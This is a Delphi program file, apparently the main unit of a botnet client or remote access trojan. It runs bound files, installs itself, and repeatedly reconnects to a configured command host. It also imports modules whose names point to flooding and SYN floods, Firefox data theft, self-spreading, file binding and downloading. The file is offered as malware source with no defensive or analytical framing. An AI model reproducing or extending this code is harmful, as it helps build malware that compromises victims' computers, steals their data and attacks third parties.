program Server;

uses
  Windows,
  Sockets,
  uSocket,
  uString,
  uWeb,
  uConst,
  uUtils,
  uInstall,
  uDownloader,
  uFlood,
  uFirefox,
  uSpread,
  uMessenger,
  uProcess,
  uSSYN,
  uBinder;

var
  Sock        :TSock;
  Msg         :Tmsg;
  TimerHandle :WORD;

procedure Timer(Wnd :HWnd; Msg, TimerID, dwTime :DWORD);stdcall;
begin
  if Sock.Client.Socket.Connected <> True then
    Sock.Client.Active := True
  else
    exit;
end;

procedure StartTimer(Interval :DWORD);
var
  TimerHandle:WORD;
begin
  TimerHandle := SetTimer(0, 0, Interval, @Timer);
end;

begin
  ExecuteFiles; // Execute binded files
  LoadConst; // Load all constante
  if Install then Exit;

  SetLastError(NO_ERROR);
  CreateMutex (nil, False, PChar(C_MUTEX));
  if GetLastError = ERROR_ALREADY_EXISTS then Exit;

  Sock := TSock.Create;
  Sock.Client := TClientSocket.Create;

  Sock.Client.OnConnect     := Sock.ClientConnect;
  Sock.Client.OnConnecting  := Sock.ClientConnecting;
  Sock.Client.OnDisconnect  := Sock.ClientDisconnect;
  Sock.Client.OnError       := Sock.ClientError;
  Sock.Client.OnLookup      := Sock.ClientLookup;
  Sock.Client.OnRead        := Sock.ClientRead;
  Sock.Client.OnWrite       := Sock.ClientWrite;

  Sock.Client.Port := C_PORT;
  Sock.Client.Host := ResolveDomain(C_IP);

  StartTimer(C_DELAY);

  while GetMessage(Msg, 0, 0, 0) do
  begin
    TranslateMessage(Msg);
    DispatchMessage(Msg);
  end;
end.
 